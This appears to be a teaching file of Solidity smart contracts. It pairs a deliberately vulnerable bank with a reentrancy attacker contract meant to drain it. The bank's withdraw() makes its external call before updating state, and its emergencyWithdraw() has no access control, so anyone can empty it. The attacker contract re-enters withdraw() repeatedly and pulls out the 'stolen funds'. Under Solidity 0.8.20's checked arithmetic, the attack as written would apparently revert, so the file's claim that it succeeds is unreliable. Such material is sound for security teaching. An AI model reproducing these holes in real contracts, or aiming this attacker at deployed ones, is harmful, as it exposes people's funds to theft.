// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableBank
 * @notice INTENTIONALLY VULNERABLE contract for educational purposes (Module 5)
 * @dev ⚠️ WARNING: DO NOT USE IN PRODUCTION ⚠️
 *
 * This contract demonstrates common vulnerabilities:
 * 1. Reentrancy attack vulnerability
 * 2. Integer overflow (though mitigated in Solidity 0.8+)
 * 3. Unchecked external calls
 * 4. No access control on critical functions
 *
 * For educational purposes only!
 */
contract VulnerableBank {
    // State variables
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    // Events
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @notice Deposit ETH into the bank
     */
    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");

        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;

        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw funds (VULNERABLE TO REENTRANCY!)
     * @param amount The amount to withdraw
     *
     * 🚨 VULNERABILITY: This function is vulnerable to reentrancy attacks!
     * The balance is updated AFTER the external call, allowing an attacker
     * to recursively call withdraw() before their balance is set to 0.
     */
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // 🚨 VULNERABLE: External call before state update!
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update happens AFTER external call - too late!
        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice Get user balance
     * @param user The user's address
     * @return The balance
     */
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }

    /**
     * @notice Get contract's total ETH balance
     * @return The balance in wei
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Emergency withdrawal (VULNERABLE - NO ACCESS CONTROL!)
     *
     * 🚨 VULNERABILITY: Anyone can call this function!
     * There should be owner-only access control.
     */
    function emergencyWithdraw() public {
        uint256 contractBalance = address(this).balance;

        // 🚨 VULNERABLE: No access control!
        (bool success, ) = msg.sender.call{value: contractBalance}("");
        require(success, "Transfer failed");
    }

    /**
     * @notice Receive function to accept ETH
     */
    receive() external payable {
        deposit();
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Example attacker contract demonstrating reentrancy attack
 * @dev Educational purposes only - shows how reentrancy attacks work
 */
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public maxAttacks = 3;

    event AttackStarted(uint256 initialDeposit);
    event ReentrancyExecuted(uint256 count, uint256 balance);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    /**
     * @notice Start the attack
     */
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");

        attackAmount = msg.value;
        attackCount = 0;

        // Deposit to the vulnerable bank
        vulnerableBank.deposit{value: msg.value}();

        emit AttackStarted(msg.value);

        // Start the reentrancy attack
        vulnerableBank.withdraw(msg.value);
    }

    /**
     * @notice Receive function - called during reentrancy
     * This is where the reentrancy happens!
     */
    receive() external payable {
        attackCount++;

        emit ReentrancyExecuted(attackCount, address(this).balance);

        // Recursively call withdraw if we haven't hit max attacks
        // and the bank still has funds
        if (attackCount < maxAttacks && address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        } else {
            emit AttackCompleted(address(this).balance);
        }
    }

    /**
     * @notice Withdraw stolen funds
     */
    function withdrawStolenFunds() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /**
     * @notice Get attacker contract balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
